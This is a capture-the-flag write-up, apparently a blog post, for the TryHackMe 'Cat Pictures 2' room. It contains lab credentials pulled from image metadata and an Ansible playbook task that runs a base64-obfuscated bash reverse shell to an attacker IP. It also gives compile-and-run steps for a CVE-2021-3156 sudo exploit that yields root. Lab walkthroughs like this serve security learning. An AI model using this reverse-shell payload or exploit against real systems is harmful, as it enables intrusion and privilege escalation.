---
title: Cat Pictures 2
description: 'Security through obscurity, exploiting a Ansible playbook script and a kernel exploit'
pubDate: 2023-08-07
category: 'tryhackme'
tags: ['ansible', 'CVE-2021-3156']
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/4c424fa649d64938ae8282b14e4299ac.png'
---

Checking the metadata of the first cat image we find this:

```bash
exiftool f5054e97620f168c7b5088c85ab1d6e4.jpg
...[snip]...
Title                           : :8080/764efa883dda1e11db47671c4a3bbd9e.txt
...[snip]...
```

```
gitea: port 3000
user: samarium
password: TUmhyZ37CLZrhP
```

## USER

Update the ansible playbook.yml file to:
```yaml
---
- name: Test
  hosts: all                                  # Define all the hosts
  remote_user: bismuth
  # Defining the Ansible task
  tasks:
    - name: get the username running the deploy
      become: false
      command: id
      register: username_on_the_host
      changed_when: false

    - debug: var=username_on_the_host

    - name: Test
      shell: echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjExOS4xMzcvNDQ0NCAwPiYx | base64 -d | bash
```

And trigger the Ansible task again on OliveTin (port 1337).
This should gives us a shell.

## ROOT

When running linpeas we find a few kernel exploits, among these is `CVE-2021-3156`.

Lets try it by copying all the files to the box and running:
```bash
make
mkdir libnss_x
cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
cc -O3 -o exploit exploit.c
./exploit
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare),1000(bismuth)

```

We instantly get a root shell.
